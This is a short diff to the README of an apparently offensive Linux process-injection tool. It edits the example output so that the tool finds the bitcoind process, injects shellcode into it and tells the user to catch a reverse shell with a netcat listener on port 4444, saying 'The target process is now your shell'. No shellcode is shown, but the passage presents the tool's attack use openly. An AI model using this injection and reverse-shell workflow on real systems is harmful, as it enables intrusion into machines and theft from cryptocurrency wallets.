@@ -60,10 +60,13 @@ Examples ./linux.out nautilus   GNOME file manager  explorer.exe
 Finding a process and injecting
 
 ```
-root@clumsy~/linux# ./linux.out bitcoind
+root@clumsy:~/linux# ./linux.out bitcoind
 [+] Found bitcoind at PID 940
-[+] Current RIP 0x7f4f7fe292dc - injecting bytes...
-[+] Done
+[+] Current RIP: 0x7f4f7fe292dc - injecting shellcode...
+[+] Shellcode injected! Catch the reverse shell with:
+    nc -lvnp 4444
+The target process is now your shell
+root@clumsy:~/linux#  
 ```
 
 ---
